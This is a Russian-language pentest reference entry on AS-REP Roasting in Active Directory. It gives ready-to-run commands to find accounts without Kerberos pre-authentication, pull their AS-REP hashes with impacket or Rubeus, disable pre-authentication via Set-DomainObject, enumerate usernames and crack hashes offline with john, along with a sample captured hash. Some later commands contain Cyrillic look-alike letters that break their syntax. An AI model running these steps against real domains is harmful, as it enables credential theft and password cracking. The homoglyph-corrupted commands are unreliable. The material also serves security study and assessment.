# AS-REP Roasting

## Кратко об атаке

Для некоторых пользователей может быть отключен этап предварительной аутентификации Kerberos (AS-REQ/AS-REP), т.е. для запроса TGT не нужен пароль пользователя. Часть TGT зашифрована на ключе krbtgt, а часть на ключе пользователя.

С помощью этой атаки мы можем сделать User Enum, и для найденных пользователей попробовать перебрать пароль оффлайн.

**Ключевое требование**: должна быть отключена предварительная аутентификация/проверка подлинности (`DONT_REQUIRE_PREAUTH`).

## Tools

* impacket GetNPUsers.py — [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
* Rubeus asreproast — [https://github.com/GhostPack/Rubeus#asreproast](https://github.com/GhostPack/Rubeus#asreproast)
* ASREPRoast.ps1 — [https://github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)

## Пример

### LDAP Filter

Ищем пользователей без предварительной аутентификации

```
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

### Get AS-REP

```bash
$ GetNPUsers.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile asreproast-hashes.txt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
han             2020-12-16 10:53:35.177156  2021-05-12 09:19:28.469863  0x410200 

root@debian10:~# cat asreproast-hashes.txt 
$krb5asrep$23$han@CONTOSO.LOCAL:73eea4275625972c2e224648c4766b5a$1bbdaba56bb6eba4ea8cb565221de2fe2b5a8ade3d1155e33aa4d786624b84a62a100d97412361c851dfbf3d95ce3d047916bc66ddcec557f70b232a1d029f6a889e49e35069494b43e4b00b892d4ccc4d31e0c4970e8aff426eaa6821133e9a2bbef017ef9241c95d0098bfea4fd2b3c2919e1247de05d19db59fec46a81a60f0f89a2d9c105b9e00011387e756cb284b0ba785655526e3ba6c51f3b8eba21e674d4f1b4e93025f9cf0dccb1f86c3247f0b9ebfc663be5510faf2b77d932351ac4899cb77be58271dc01a3304bfd1de6216e04e5d9033859b92fa87438863c2dff112237c2ace8cffbc2dbb57c6
```

### Brute TGT

Можно попробовать запросить TGS с RC4, чтобы брутить было легче, но по умолчанию приходит с AES256.

* hashcat
* john

```
john --wordlist=dict.txt krbt.hashes
```

## Подробно об атаке

При обычных операциях в среде Windows Kerberos, когда пользователь инициирует запрос TGT (операция Kerberos AS-REQ), он должен указать временную метку, зашифрованную своим паролем (ключом). Метка представляет собой структуру PA-ENC-TIMESTAMP и встроена в PA-DATA (данные предварительной авторизации) AS-REQ. KDC расшифровывает эту метку, чтобы проверить, действительно ли совершающий операцию субъект — тот, за кого себя выдает, а затем возвращает AS-REP и продолжает обычные процедуры аутентификации.

Подобная проверка называется предварительной аутентификацией Kerberos и необходима для предотвращения автономного угадывания пароля. Но проверку можно отключить выставлением флага DONT\_REQ\_PREAUTH в UAC учетной записи пользователя. Чтобы отключить проверку для конкретного пользователя, оператору необходимо наличие привилегии GenericWrite или GenericAll.

```
Set-DomainObject -Identity [пользователь] -XOR @{useraccountcontrol=4194304}
```

Дело в том, что при отключенной предварительной аутентификации Kerberos KDC все равно вернет AS-REP, который, в свою очередь, зашифрован с помощью ключа службы krbtgt. Но зашифрованная часть AS-REP подписывается клиентским ключом, то есть ключом пользователя, для которого отправляется AS-REQ.

Выполнить атаку можно локально с помощью того же Rubeus.

```
PS> Rubeus.exe asreproast
```

Для удаленной атаки нам нужно узнать пользователей, у которых отключена предварительная аутентификация Kerberos, для чего необходимо иметь учетные данные любого пользователя в домене.

```
(impacket)> GetNPUsers.py [домен]/[пользователь]:[пароль]
```

Теперь выполним запрос для найденного пользователя.

```
(impacket)> GetNPUsers.py [домен]/[пользователь] -k -no-рass -dc-iр [IР]
```

Различие между Kerberoasting и AS-REР Roasting состоит в том, что для данной атаки нужно только имя пользователя, то есть можно составить список и проверить сразу несколько имен. Плюс ко всему можно также узнать, какие пользователи зарегистрированы в системе, а какие нет.

```
PS> cat users.txt
alice
bob
...

(impacket)> GetNPUsers.py mydomain/ -usersfile users.txt
```

Взломать полученный хеш можно с помощью John the Riррer.

```
john --wordlist=dict.txt krbt.hashes
```

Другое различие между Kerberoasting и AS-REР Roasting заключается в том, что AS-REP запрашивает билет проверки подлинности Kerberos (TGT), а не билет проверки подлинности службы (TGS).
